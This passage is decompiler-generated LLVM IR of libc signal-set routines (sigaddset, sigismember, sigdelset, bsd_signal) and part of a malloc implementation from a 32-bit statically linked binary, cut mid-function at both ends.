dec_label_pc_8053d4b:                             ; preds = %entry
  %v1_8053d4b = add i32 %arg1, -64
  %v3_8053d4b = sub i32 63, %arg1
  %v4_8053d4b = and i32 %v3_8053d4b, %arg1
  %v5_8053d4b = icmp slt i32 %v4_8053d4b, 0
  %v6_8053d4b = icmp eq i32 %v1_8053d4b, 0
  %v7_8053d4b = icmp slt i32 %v1_8053d4b, 0
  %v3_8053d4e = icmp eq i1 %v7_8053d4b, %v5_8053d4b
  %v4_8053d4e = icmp eq i1 %v6_8053d4b, false
  %v5_8053d4e = and i1 %v4_8053d4e, %v3_8053d4e
  br i1 %v5_8053d4e, label %dec_label_pc_8053d58, label %dec_label_pc_8053d50

dec_label_pc_8053d50:                             ; preds = %dec_label_pc_8053d4b
  %v4_8053d53 = call i32 @__sigaddset(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8053d58

dec_label_pc_8053d58:                             ; preds = %dec_label_pc_8053d4b, %entry, %dec_label_pc_8053d50
  %v1_8053d58 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_8053d5d = inttoptr i32 %v1_8053d58 to i32*
  store i32 22, i32* %v1_8053d5d, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_8053d4b, { 1, 0 }
  uselistorder i32 -64, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8053d58, { 2, 0, 1 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  %v3_8053d7a = inttoptr i32 %arg1 to i8*
  %v4_8053d7a = call i32 @__GI_memset(i8* %v3_8053d7a, i32 0, i32 128)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_8053d88 = load i32, i32* @ebx, align 4
  %v15_8053d89 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_8053d9d = icmp eq i32 %arg2, -1
  br i1 %v10_8053d9d, label %dec_label_pc_8053dab, label %dec_label_pc_8053da2

dec_label_pc_8053da2:                             ; preds = %entry
  %tmp16 = icmp slt i32 %arg1, 1
  br i1 %tmp16, label %dec_label_pc_8053dab, label %dec_label_pc_8053da6

dec_label_pc_8053da6:                             ; preds = %dec_label_pc_8053da2
  %v7_8053da9 = icmp sgt i32 %arg1, 64
  br i1 %v7_8053da9, label %dec_label_pc_8053dab, label %dec_label_pc_8053db8

dec_label_pc_8053dab:                             ; preds = %dec_label_pc_8053da6, %dec_label_pc_8053da2, %entry
  %v1_8053dab = call i32 @__errno_location(i32 %v0_8053d88)
  store i32 %v1_8053dab, i32* %eax.global-to-local, align 4
  %v1_8053db0 = inttoptr i32 %v1_8053dab to i32*
  store i32 22, i32* %v1_8053db0, align 4
  br label %dec_label_pc_8053e2c

dec_label_pc_8053db8:                             ; preds = %dec_label_pc_8053da6
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053dc6

dec_label_pc_8053dc6:                             ; preds = %dec_label_pc_8053dc6.dec_label_pc_8053dc6_crit_edge, %dec_label_pc_8053db8
  %v0_8053dc6 = phi i32 [ %v15_8053d89, %dec_label_pc_8053db8 ], [ %v0_8053dc6.pre, %dec_label_pc_8053dc6.dec_label_pc_8053dc6_crit_edge ]
  %v1_8053dd117 = phi i32 [ 31, %dec_label_pc_8053db8 ], [ %v1_8053dd1, %dec_label_pc_8053dc6.dec_label_pc_8053dc6_crit_edge ]
  %v2_8053dc6 = mul i32 %v1_8053dd117, 4
  %v3_8053dc6 = add i32 %v2_8053dc6, 160
  %v4_8053dc6 = add i32 %v3_8053dc6, %v0_8053dc6
  %v5_8053dc6 = inttoptr i32 %v4_8053dc6 to i32*
  store i32 0, i32* %v5_8053dc6, align 4
  %v0_8053dd1.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8053dd1 = add i32 %v0_8053dd1.pre, -1
  %v9_8053dd1 = icmp slt i32 %v1_8053dd1, 0
  store i32 %v1_8053dd1, i32* %eax.global-to-local, align 4
  %v1_8053dd2 = icmp eq i1 %v9_8053dd1, false
  br i1 %v1_8053dd2, label %dec_label_pc_8053dc6.dec_label_pc_8053dc6_crit_edge, label %dec_label_pc_8053dd4

dec_label_pc_8053dc6.dec_label_pc_8053dc6_crit_edge: ; preds = %dec_label_pc_8053dc6
  %v0_8053dc6.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053dc6

dec_label_pc_8053dd4:                             ; preds = %dec_label_pc_8053dc6
  %v0_8053dd4 = load i32, i32* @edx, align 4
  %v2_8053dd7 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_8053dd7, i32* %eax.global-to-local, align 4
  %v4_8053ddf = call i32 @__sigaddset(i32 %v2_8053dd7, i32 %arg1, i32 %v0_8053dd4, i32 %v0_8053dd4)
  store i32 %v4_8053ddf, i32* %eax.global-to-local, align 4
  %v2_8053de7 = icmp slt i32 %v4_8053ddf, 0
  br i1 %v2_8053de7, label %dec_label_pc_8053e2c, label %dec_label_pc_8053deb

dec_label_pc_8053deb:                             ; preds = %dec_label_pc_8053dd4
  %v4_8053df3 = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_8064720.520 to i32), i32 %arg1, i32 %v4_8053ddf, i32 %v4_8053ddf)
  %v2_8053e0c = ptrtoint i32* %stack_var_-284 to i32
  %v2_8053e11 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8053e11, i32* %eax.global-to-local, align 4
  %v4_8053e1a = call i32 @__libc_sigaction(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_8053e0c)
  store i32 %v4_8053e1a, i32* %eax.global-to-local, align 4
  %v2_8053e22 = icmp slt i32 %v4_8053e1a, 0
  br i1 %v2_8053e22, label %dec_label_pc_8053e2c, label %dec_label_pc_8053e26

dec_label_pc_8053e26:                             ; preds = %dec_label_pc_8053deb
  %v3_8053e26 = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_8053e2f

dec_label_pc_8053e2c:                             ; preds = %dec_label_pc_8053deb, %dec_label_pc_8053dd4, %dec_label_pc_8053dab
  br label %dec_label_pc_8053e2f

dec_label_pc_8053e2f:                             ; preds = %dec_label_pc_8053e26, %dec_label_pc_8053e2c
  %storemerge = phi i32 [ -1, %dec_label_pc_8053e2c ], [ %v3_8053e26, %dec_label_pc_8053e26 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8053d88, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8053dd1, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 9, 0, 1, 2, 3, 4, 7, 8, 5, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 1, 4, 0, 5 }
  uselistorder label %dec_label_pc_8053e2f, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_8053e46 = add i32 %arg2, -1
  %v1_8053e49 = urem i32 %v1_8053e46, 32
  %v2_8053e49 = icmp eq i32 %v1_8053e49, 0
  %v2_8053e4c = udiv i32 %v1_8053e46, 32
  br i1 %v2_8053e49, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_8053e4f = shl i32 1, %v1_8053e49
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_8053e51 = phi i32 [ 1, %entry ], [ %v5_8053e4f, %bb ]
  %v2_8053e51 = mul nuw nsw i32 %v2_8053e4c, 4
  %v3_8053e51 = add i32 %v2_8053e51, %arg1
  %v4_8053e51 = inttoptr i32 %v3_8053e51 to i32*
  %v5_8053e51 = load i32, i32* %v4_8053e51, align 4
  %v7_8053e51 = and i32 %v5_8053e51, %v6_8053e51
  %v8_8053e51 = icmp eq i32 %v7_8053e51, 0
  %v1_8053e55 = icmp eq i1 %v8_8053e51, false
  %v2_8053e55 = zext i1 %v1_8053e55 to i32
  ret i32 %v2_8053e55

; uselistorder directives
  uselistorder i32 %v1_8053e49, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8053e5c = load i32, i32* @ebx, align 4
  store i32 %v0_8053e5c, i32* %stack_var_-4, align 4
  %v1_8053e6a = add i32 %arg2, -1
  %v1_8053e6d = urem i32 %v1_8053e6a, 32
  %v2_8053e6d = icmp eq i32 %v1_8053e6d, 0
  store i32 %v1_8053e6d, i32* @ecx, align 4
  br i1 %v2_8053e6d, label %bb6, label %bb

bb:                                               ; preds = %entry
  %v5_8053e70 = shl i32 1, %v1_8053e6d
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %v6_8053e75 = phi i32 [ 1, %entry ], [ %v5_8053e70, %bb ]
  %v2_8053e72 = udiv i32 %v1_8053e6a, 32
  store i32 %v2_8053e72, i32* @edx, align 4
  %v2_8053e75 = mul nuw nsw i32 %v2_8053e72, 4
  %v3_8053e75 = add i32 %v2_8053e75, %arg1
  %v4_8053e75 = inttoptr i32 %v3_8053e75 to i32*
  %v5_8053e75 = load i32, i32* %v4_8053e75, align 4
  %v7_8053e75 = or i32 %v5_8053e75, %v6_8053e75
  store i32 %v7_8053e75, i32* %v4_8053e75, align 4
  %v2_8053e7a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8053e7a, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_8053e72, { 1, 0 }
  uselistorder i32 %v1_8053e6d, { 2, 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8053e8a = add i32 %arg2, -1
  %v1_8053e8d = urem i32 %v1_8053e8a, 32
  %v2_8053e8d = icmp eq i32 %v1_8053e8d, 0
  br i1 %v2_8053e8d, label %bb6, label %bb

bb:                                               ; preds = %entry
  %v4_8053e90 = shl i32 -2, %v1_8053e8d
  %v5_8053e90 = sub nsw i32 32, %v1_8053e8d
  %v6_8053e90 = lshr i32 -2, %v5_8053e90
  %v7_8053e90 = or i32 %v6_8053e90, %v4_8053e90
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %v6_8053e95 = phi i32 [ -2, %entry ], [ %v7_8053e90, %bb ]
  %v2_8053e92 = udiv i32 %v1_8053e8a, 32
  %v2_8053e95 = mul nuw nsw i32 %v2_8053e92, 4
  %v3_8053e95 = add i32 %v2_8053e95, %arg1
  %v4_8053e95 = inttoptr i32 %v3_8053e95 to i32*
  %v5_8053e95 = load i32, i32* %v4_8053e95, align 4
  %v7_8053e95 = and i32 %v5_8053e95, %v6_8053e95
  store i32 %v7_8053e95, i32* %v4_8053e95, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8053e8d, { 1, 2, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__malloc_largebin_index() local_unnamed_addr {
entry:
  %v0_8053e9c = load i32, i32* @eax, align 4
  %v6_8053eaf = icmp ugt i32 %v0_8053e9c, 16777215
  br i1 %v6_8053eaf, label %dec_label_pc_8053ec0, label %dec_label_pc_8053eb1

dec_label_pc_8053eb1:                             ; preds = %entry
  %tmp = icmp ult i32 %v0_8053e9c, 256
  %v2_8053e9e = udiv i32 %v0_8053e9c, 256
  %v2_8053eb1 = call i32 @llvm.ctlz.i32(i32 %v2_8053e9e, i1 true)
  %v3_8053eb1 = xor i32 %v2_8053eb1, 31
  %v5_8053eb1 = select i1 %tmp, i32 95, i32 %v3_8053eb1
  %v1_8053eb4 = add nuw nsw i32 %v5_8053eb1, 6
  store i32 %v1_8053eb4, i32* @ecx, align 4
  %v2_8053eb7 = urem i32 %v1_8053eb4, 32
  %v4_8053eb7 = icmp eq i32 %v2_8053eb7, 0
  br i1 %v4_8053eb7, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_8053eb1
  %v5_8053eb7 = lshr i32 %v0_8053e9c, %v2_8053eb7
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_8053eb1, %bb
  %v0_8053eb9 = phi i32 [ %v0_8053e9c, %dec_label_pc_8053eb1 ], [ %v5_8053eb7, %bb ]
  %v1_8053eb9 = urem i32 %v0_8053eb9, 4
  %v2_8053ebc = mul nuw nsw i32 %v5_8053eb1, 4
  %v3_8053ebc = or i32 %v1_8053eb9, 32
  %v4_8053ebc = add nuw nsw i32 %v3_8053ebc, %v2_8053ebc
  br label %dec_label_pc_8053ec0

dec_label_pc_8053ec0:                             ; preds = %entry, %bb4
  %v0_8053ec1 = phi i32 [ 95, %entry ], [ %v4_8053ebc, %bb4 ]
  ret i32 %v0_8053ec1

; uselistorder directives
  uselistorder i32 %v2_8053eb7, { 1, 0 }
  uselistorder i32 %v0_8053e9c, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_8053ec0, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8053ec2 = load i32, i32* @ebp, align 4
  %v0_8053ec3 = load i32, i32* @edi, align 4
  %v0_8053ec4 = load i32, i32* @esi, align 4
  %v0_8053ec5 = load i32, i32* @ebx, align 4
  store i32 %v0_8053ec5, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8053ed7 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8053ed7, i32* @eax, align 4
  store i32 %v2_8053ed7, i32* %stack_var_-92, align 4
  %v2_8053edc = call i32 @__pthread_return_void(i32 %v2_8053ed7, i32 134567263)
  store i32 %v2_8053edc, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805e330.521 to i32), i32* %stack_var_-92, align 4
  %v1_8053ee8 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805e330.521 to i32))
  store i32 %v1_8053ee8, i32* %eax.global-to-local, align 4
  %v0_8053ef0 = load i32, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v0_8053ef0, -32
  br i1 %tmp, label %dec_label_pc_8053f07, label %dec_label_pc_8053ef5

dec_label_pc_8053ef5:                             ; preds = %entry
  %v0_8053ef5 = load i32, i32* %stack_var_-92, align 4
  %v1_8053ef5 = call i32 @__errno_location(i32 %v0_8053ef5)
  store i32 %v1_8053ef5, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8053efc = inttoptr i32 %v1_8053ef5 to i32*
  store i32 12, i32* %v1_8053efc, align 4
  br label %dec_label_pc_805465a

dec_label_pc_8053f07:                             ; preds = %entry
  %v1_8053f07 = add i32 %v0_8053ef0, 11
  %tmp136 = icmp ult i32 %v1_8053f07, 16
  br i1 %tmp136, label %dec_label_pc_8053f1e, label %dec_label_pc_8053f17

dec_label_pc_8053f17:                             ; preds = %dec_label_pc_8053f07
  %v1_8053f17 = and i32 %v1_8053f07, -8
  br label %dec_label_pc_8053f1e

dec_label_pc_8053f1e:                             ; preds = %dec_label_pc_8053f07, %dec_label_pc_8053f17
  %storemerge133 = phi i32 [ %v1_8053f17, %dec_label_pc_8053f17 ], [ %v1_8053f07, %dec_label_pc_8053f07 ]
  %v1_80542be = phi i32 [ %v1_8053f17, %dec_label_pc_8053f17 ], [ 16, %dec_label_pc_8053f07 ]
  store i32 %storemerge133, i32* %eax.global-to-local, align 4
  %v0_8053f1e = load i8, i8* @global_var_80647a0.522, align 1
  %v1_8053f1e = sext i8 %v0_8053f1e to i32
  store i32 %v1_8053f1e, i32* @ebx, align 4
  %v3_8053f24 = urem i8 %v0_8053f1e, 2
  %v4_8053f24 = icmp eq i8 %v3_8053f24, 0
  %v1_8053f27 = icmp eq i1 %v4_8053f24, false
  br i1 %v1_8053f27, label %dec_label_pc_8053f46, label %dec_label_pc_8053f29

dec_label_pc_8053f29:                             ; preds = %dec_label_pc_8053f1e
  %v2_8053f29 = icmp eq i8 %v0_8053f1e, 0
  %v1_8053f2b = icmp eq i1 %v2_8053f29, false
  br i1 %v1_8053f2b, label %dec_label_pc_8054229, label %dec_label_pc_8053f31

dec_label_pc_8053f31:                             ; preds = %dec_label_pc_8053f29
  store i32 ptrtoint (i8* @global_var_80647a0.522 to i32), i32* %stack_var_-92, align 4
  %v2_8053f39 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_80647a0.522 to i32*))
  store i32 %v2_8053f39, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054229

dec_label_pc_8053f46:                             ; preds = %dec_label_pc_8053f1e
  %v11_8053f46 = trunc i32 %v1_80542be to i8
  %v8_8053f4a = icmp ugt i8 %v11_8053f46, %v0_8053f1e
  br i1 %v8_8053f4a, label %dec_label_pc_8053f67, label %dec_label_pc_8053f4c

dec_label_pc_8053f4c:                             ; preds = %dec_label_pc_8053f46
  %v2_8053f50 = udiv i32 %v1_80542be, 2
  store i32 %v2_8053f50, i32* %eax.global-to-local, align 4
  %v1_8053f52 = add i32 %v2_8053f50, ptrtoint (i8* @global_var_80647a0.522 to i32)
  store i32 %v1_8053f52, i32* @ecx, align 4
  %v1_8053f58 = add i32 %v2_8053f50, add (i32 ptrtoint (i8* @global_var_80647a0.522 to i32), i32 -4)
  %v2_8053f58 = inttoptr i32 %v1_8053f58 to i32*
  %v3_8053f58 = load i32, i32* %v2_8053f58, align 4
  store i32 %v3_8053f58, i32* @edx, align 4
  %v1_8053f5b = icmp eq i32 %v3_8053f58, 0
  br i1 %v1_8053f5b, label %dec_label_pc_8053f67, label %dec_label_pc_8053f5f

dec_label_pc_8053f5f:                             ; preds = %dec_label_pc_8053f4c
  %v1_8053f5f = add i32 %v3_8053f58, 8
  %v2_8053f5f = inttoptr i32 %v1_8053f5f to i32*
  %v3_8053f5f = load i32, i32* %v2_8053f5f, align 4
  store i32 %v3_8053f5f, i32* %eax.global-to-local, align 4
  store i32 %v3_8053f5f, i32* %v2_8053f58, align 4
  br label %dec_label_pc_8053fa0

dec_label_pc_8053f67:                             ; preds = %dec_label_pc_8053f4c, %dec_label_pc_8053f46
  %v8_8053f67 = icmp ult i32 %v1_80542be, 255
  %v6_8053f6f = icmp ugt i32 %v1_80542be, 255
  store i32 %v1_80542be, i32* @eax, align 4
  br i1 %v6_8053f6f, label %dec_label_pc_8053fa8, label %dec_label_pc_8053f71

dec_label_pc_8053f71:                             ; preds = %dec_label_pc_8053f67
  %v2_8053f75 = udiv i32 %v1_80542be, 8
  store i32 %v2_8053f75, i32* %eax.global-to-local, align 4
  %v1_8053f78 = mul nuw i32 %v2_8053f75, 8
  %v2_8053f78 = add i32 %v1_8053f78, ptrtoint (i32* @global_var_80647cc.523 to i32)
  store i32 %v2_8053f78, i32* @ecx, align 4
  %v1_8053f83 = add i32 %v1_8053f78, add (i32 ptrtoint (i32* @global_var_80647cc.523 to i32), i32 12)
  %v2_8053f83 = inttoptr i32 %v1_8053f83 to i32*
  %v3_8053f83 = load i32, i32* %v2_8053f83, align 4
  store i32 %v3_8053f83, i32* @edx, align 4
  %v12_8053f86 = icmp eq i32 %v3_8053f83, %v2_8053f78
  br i1 %v12_8053f86, label %dec_label_pc_80540a4.preheader, label %dec_label_pc_8053f8e

dec_label_pc_8053f8e:                             ; preds = %dec_label_pc_8053f71
  store i32 %v1_80542be, i32* %ebx.global-to-local, align 4
  %v1_8053f92 = add i32 %v3_8053f83, 12
  %v2_8053f92 = inttoptr i32 %v1_8053f92 to i32*
  %v3_8053f92 = load i32, i32* %v2_8053f92, align 4
  store i32 %v3_8053f92, i32* %eax.global-to-local, align 4
  %v2_8053f95 = or i32 %v1_80542be, 4
  %v3_8053f95 = add i32 %v3_8053f83, %v2_8053f95
  %v4_8053f95 = inttoptr i32 %v3_8053f95 to i32*
  %v5_8053f95 = load i32, i32* %v4_8053f95, align 4
  %v6_8053f95 = or i32 %v5_8053f95, 1
  store i32 %v6_8053f95, i32* %v4_8053f95, align 4
  %v0_8053f9a = load i32, i32* %eax.global-to-local, align 4
  %v1_8053f9a = load i32, i32* @ecx, align 4
  %v2_8053f9a = add i32 %v1_8053f9a, 12
  %v3_8053f9a = inttoptr i32 %v2_8053f9a to i32*
  store i32 %v0_8053f9a, i32* %v3_8053f9a, align 4
  %v0_8053f9d = load i32, i32* @ecx, align 4
  %v1_8053f9d = load i32, i32* %eax.global-to-local, align 4
  %v2_8053f9d = add i32 %v1_8053f9d, 8
  %v3_8053f9d = inttoptr i32 %v2_8053f9d to i32*
  store i32 %v0_8053f9d, i32* %v3_8053f9d, align 4
  br label %dec_label_pc_8053fa0

dec_label_pc_8053fa0:                             ; preds = %dec_label_pc_8053f5f, %dec_label_pc_8053f8e
  %v0_8053fa0 = load i32, i32* @edx, align 4
  %v1_8053fa0 = add i32 %v0_8053fa0, 8
  store i32 %v1_8053fa0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054649

dec_label_pc_8053fa8:                             ; preds = %dec_label_pc_8053f67
  %v0_8053fac = call i32 @__malloc_largebin_index()
  store i32 %v0_8053fac, i32* %eax.global-to-local, align 4
  %v3_8053fb1 = and i8 %v0_8053f1e, 2
  %v4_8053fb1 = icmp eq i8 %v3_8053fb1, 0
  br i1 %v4_8053fb1, label %dec_label_pc_80540a4.preheader, label %dec_label_pc_8053fbe

dec_label_pc_8053fbe:                             ; preds = %dec_label_pc_8053fa8
  store i32 ptrtoint (i8* @global_var_80647a0.522 to i32), i32* %stack_var_-92, align 4
  %v2_8053fc6 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_80647a0.522 to i32*))
  store i32 %v2_8053fc6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80540a4.preheader

dec_label_pc_80540a4.preheader:                   ; preds = %dec_label_pc_8053fbe, %dec_label_pc_8053f71, %dec_label_pc_8053fa8
  %stack_var_-40.0.ph = phi i32 [ %v2_8053f75, %dec_label_pc_8053f71 ], [ %v0_8053fac, %dec_label_pc_8053fbe ], [ %v0_8053fac, %dec_label_pc_8053fa8 ]
  %v1_8053ffa = add i32 %v1_80542be, 16
  %v0_80540a4109 = load i32, i32* @global_var_80647e0.526, align 32
  store i32 %v0_80540a4109, i32* @ebp, align 4
  %v9_80540aa115 = icmp eq i32 %v0_80540a4109, 134629332
  %v1_80540b0117 = icmp eq i1 %v9_80540aa115, false
  br i1 %v1_80540b0117, label %dec_label_pc_8053fd3, label %dec_label_pc_80540b6

dec_label_pc_8053fd3:                             ; preds = %dec_label_pc_80540a4.preheader, %bb82
  %v0_80540a4118 = phi i32 [ %v0_80540a4, %bb82 ], [ %v0_80540a4109, %dec_label_pc_80540a4.preheader ]
  %v1_8053fd3 = add i32 %v0_80540a4118, 4
  %v2_8053fd3 = inttoptr i32 %v1_8053fd3 to i32*
  %v3_8053fd3 = load i32, i32* %v2_8053fd3, align 4
  %v1_8053fd6 = add i32 %v0_80540a4118, 12
  %v2_8053fd6 = inttoptr i32 %v1_8053fd6 to i32*
  %v3_8053fd6 = load i32, i32* %v2_8053fd6, align 4
  store i32 %v3_8053fd6, i32* @edx, align 4
  %v1_8053fd9 = and i32 %v3_8053fd3, -4
  store i32 %v1_8053fd9, i32* @edi, align 4
  br i1 %v6_8053f6f, label %dec_label_pc_8054005, label %dec_label_pc_8053fe6

dec_label_pc_8053fe6:                             ; preds = %dec_label_pc_8053fd3
  %v9_8053fe6 = icmp eq i32 %v3_8053fd6, 134629332
  %v1_8053fec = icmp eq i1 %v9_8053fe6, false
  br i1 %v1_8053fec, label %dec_label_pc_8054005, label %dec_label_pc_8053fee

dec_label_pc_8053fee:                             ; preds = %dec_label_pc_8053fe6
  %v1_8053fee = load i32, i32* @global_var_80647d0.524, align 16
  %v12_8053fee = icmp eq i32 %v0_80540a4118, %v1_8053fee
  %v1_8053ff4 = icmp eq i1 %v12_8053fee, false
  br i1 %v1_8053ff4, label %dec_label_pc_8054005, label %dec_label_pc_8053ff6

dec_label_pc_8053ff6:                             ; preds = %dec_label_pc_8053fee
  store i32 %v1_8053ffa, i32* %eax.global-to-local, align 4
  %v6_8053fff = icmp ugt i32 %v1_8053fd9, %v1_8053ffa
  br i1 %v6_8053fff, label %dec_label_pc_80545e4, label %dec_label_pc_8054005

dec_label_pc_8054005:                             ; preds = %dec_label_pc_8053ff6, %dec_label_pc_8053fee, %dec_label_pc_8053fe6, %dec_label_pc_8053fd3
  store i32 ptrtoint (i32* @global_var_80647d4.525 to i32), i32* %eax.global-to-local, align 4
  store i32 %v3_8053fd6, i32* @global_var_80647e0.526, align 4
  %v2_805400d = add i32 %v3_8053fd6, 8
  %v3_805400d = inttoptr i32 %v2_805400d to i32*
  store i32 ptrtoint (i32* @global_var_80647d4.525 to i32), i32* %v3_805400d, align 4
  %v0_8054010 = load i32, i32* @edi, align 4
  %v15_8054010 = icmp eq i32 %v0_8054010, %v1_80542be
  br i1 %v15_8054010, label %dec_label_pc_8054625, label %dec_label_pc_805401a

dec_label_pc_805401a:                             ; preds = %dec_label_pc_8054005
  %v6_8054020 = icmp ugt i32 %v0_8054010, 255
  br i1 %v6_8054020, label %dec_label_pc_8054033, label %dec_label_pc_8054022

dec_label_pc_8054022:                             ; preds = %dec_label_pc_805401a
  %v2_8054024 = udiv i32 %v0_8054010, 8
  store i32 %v2_8054024, i32* %esi.global-to-local, align 4
  %v1_8054027 = mul nuw i32 %v2_8054024, 8
  %v2_8054027 = add i32 %v1_8054027, 134629324
  store i32 %v2_8054027, i32* @ebx, align 4
  %v1_805402e = add i32 %v1_8054027, 134629332
  %v2_805402e = inttoptr i32 %v1_805402e to i32*
  %v3_805402e = load i32, i32* %v2_805402e, align 4
  store i32 %v3_805402e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805407c

dec_label_pc_8054033:                             ; preds = %dec_label_pc_805401a
  store i32 %v0_8054010, i32* @eax, align 4
  %v0_8054035 = call i32 @__malloc_largebin_index()
  store i32 %v0_8054035, i32* %esi.global-to-local, align 4
  %v1_805403c = mul i32 %v0_8054035, 8
  %v2_805403c = add i32 %v1_805403c, ptrtoint (i32* @global_var_80647cc.523 to i32)
  store i32 %v2_805403c, i32* %eax.global-to-local, align 4
  %v1_8054043 = add i32 %v1_805403c, add (i32 ptrtoint (i32* @global_var_80647cc.523 to i32), i32 8)
  %v2_8054043 = inttoptr i32 %v1_8054043 to i32*
  %v3_8054043 = load i32, i32* %v2_8054043, align 4
  store i32 %v3_8054043, i32* %edx.global-to-local, align 4
  %v12_8054046 = icmp eq i32 %v3_8054043, %v2_805403c
  store i32 %v3_8054043, i32* @ebx, align 4
  br i1 %v12_8054046, label %dec_label_pc_805407c, label %dec_label_pc_8054050

dec_label_pc_8054050:                             ; preds = %dec_label_pc_8054033
  %v1_8054050 = add i32 %v1_805403c, add (i32 ptrtoint (i32* @global_var_80647cc.523 to i32), i32 12)
  %v2_8054050 = inttoptr i32 %v1_8054050 to i32*
  %v3_8054050 = load i32, i32* %v2_8054050, align 4
  store i32 %v3_8054050, i32* @ebx, align 4
  %v0_8054053 = load i32, i32* @edi, align 4
  %v2_8054053 = add i32 %v3_8054050, 4
  %v3_8054053 = inttoptr i32 %v2_8054053 to i32*
  %v4_8054053 = load i32, i32* %v3_8054053, align 4
  %v10_8054053 = icmp ult i32 %v0_8054053, %v4_8054053
  %v1_8054056 = icmp eq i1 %v10_8054053, false
  br i1 %v1_8054056, label %dec_label_pc_805405e, label %dec_label_pc_805407c

dec_label_pc_805405e:                             ; preds = %dec_label_pc_8054050
  %v1_8054060 = or i32 %v0_8054053, 1
  store i32 %v1_8054060, i32* %eax.global-to-local, align 4
  store i32 %v3_8054043, i32* %ebx.global-to-local, align 4
  %v2_8054074101 = add i32 %v3_8054043, 4
  %v3_8054074102 = inttoptr i32 %v2_8054074101 to i32*
  %v4_8054074103 = load i32, i32* %v3_8054074102, align 4
  %v10_8054074105 = icmp ult i32 %v1_8054060, %v4_8054074103
  br i1 %v10_8054074105, label %dec_label_pc_8054065, label %dec_label_pc_8054079

dec_label_pc_8054065:                             ; preds = %dec_label_pc_805405e, %dec_label_pc_8054065
  %v0_8054079106 = phi i32 [ %v3_8054069, %dec_label_pc_8054065 ], [ %v3_8054043, %dec_label_pc_805405e ]
  store i32 %v0_8054079106, i32* %ecx.global-to-local, align 4
  %v1_8054069 = add i32 %v0_8054079106, 8
  %v2_8054069 = inttoptr i32 %v1_8054069 to i32*
  %v3_8054069 = load i32, i32* %v2_8054069, align 4
  store i32 %v3_8054069, i32* %ecx.global-to-local, align 4
  store i32 %v3_8054069, i32* %ebx.global-to-local, align 4
  %v2_8054074 = add i32 %v3_8054069, 4
  %v3_8054074 = inttoptr i32 %v2_8054074 to i32*
  %v4_8054074 = load i32, i32* %v3_8054074, align 4
  %v10_8054074 = icmp ult i32 %v1_8054060, %v4_8054074
